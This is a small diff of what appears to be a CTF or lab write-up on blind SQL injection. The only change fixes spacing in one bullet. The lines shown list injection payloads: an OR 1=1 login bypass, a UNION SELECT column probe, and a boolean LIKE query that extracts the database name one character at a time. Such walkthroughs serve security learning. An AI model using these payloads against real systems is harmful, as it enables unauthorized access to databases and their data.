@@ -22,7 +22,7 @@
 ## *Blind SQLi*
 >	- Using `' OR 1=1;--` in the password field to bypass the login.![](flag-2.png)
 >	- Using `admin123' UNION SELECT NULL;--` to get the column names.![](bool-1.png)![](bool-2.png)
->	-  Using `'UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--` to get the database name.![](bool-3.png)
+>	- Using `'UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--` to get the database name.![](bool-3.png)
 >	- Change the value till a true occurs.![](bool-4.png)
 >	- Keep adding characters till we get the entire name.![](bool-5.png)
 >	- Now use the found name to enumerate the tables.
